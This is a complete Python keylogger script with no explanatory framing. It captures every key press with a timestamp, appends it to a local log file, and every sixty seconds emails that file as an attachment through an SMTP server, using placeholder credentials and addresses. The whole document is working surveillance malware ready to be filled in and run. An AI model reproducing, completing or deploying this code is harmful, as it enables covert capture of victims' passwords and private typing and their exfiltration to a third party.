import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time

log_file = 'we.txt'
email_interval = 60  # Time interval in seconds to send email

def send_email(log_file):
    # Email credentials
    sender_email = "your_email@example.com"
    sender_password = "your_email_password"
    recipient_email = "recipient_email@example.com"
    subject = "Keylogger Log File"
    
    # Create the email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    with open(log_file, 'r') as f:
        attachment = MIMEApplication(f.read(), Name=log_file)
    
    attachment['Content-Disposition'] = f'attachment; filename="{log_file}"'
    msg.attach(attachment)
    
    # Connect to the server and send the email
    try:
        server = smtplib.SMTP('smtp.example.com', 587)  # Replace with the SMTP server and port of your email provider
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_key_press(event):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, 'a') as f:
        f.write('{} - {}\n'.format(timestamp, event.name))

keyboard.on_press(on_key_press)

# Email sending loop
while True:
    time.sleep(email_interval)
    send_email(log_file)
